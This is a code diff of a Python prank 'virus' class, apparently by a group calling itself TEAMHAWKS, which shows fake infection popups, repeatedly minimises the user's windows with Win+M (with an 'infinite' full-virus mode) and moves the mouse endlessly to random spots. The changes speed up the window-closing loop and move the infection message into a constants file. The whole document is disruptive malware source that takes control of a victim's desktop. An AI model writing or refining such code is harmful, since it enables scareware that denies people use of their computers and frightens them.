@@ -7,6 +7,8 @@ import random
 import pyautogui as win
 from time import sleep 
 
+import Constants as C
+
 class popupGenerator():
     def __init__(self):
         pass
@@ -16,7 +18,7 @@ class popupGenerator():
 
     def move_window(self):
         root = Tk()
-        root.title("Haz sido infectado por el virus de TEAMHAWKS")
+        root.title(C.POPUP_MESSAGE)
         root.attributes('-toolwindow',True)
         root.attributes('-disabled',True)
 
@@ -42,6 +44,13 @@ class popupGenerator():
                     thread.start()
 
     def closeWindows(infinite=False):
+        """
+        Función para el cerrado de las ventanas del usuario.
+
+        Args:
+            infinite (bool, optional): 
+            Especifica si se trabajará con la versión infinita del código (virus completo) o no (virus diluido para pruebas). Defaults to False.
+        """
         if infinite == False:
             for i in range(10):
                 win.keyDown('winleft')
@@ -53,11 +62,11 @@ class popupGenerator():
                 win.keyDown('winleft')
                 win.press('m')
                 win.keyUp('winleft')
-                sleep(0.5)
+                sleep(0.1)
 
     def moveMouse(self):
         while True:
-            x = random.randint(0, win.size().width - 100)
-            y = random.randint(0,win.size().height - 100)
+            x = random.randint(0, win.size().width - 10)
+            y = random.randint(0,win.size().height - 10)
             win.moveTo(x,y,10)
             sleep(5)
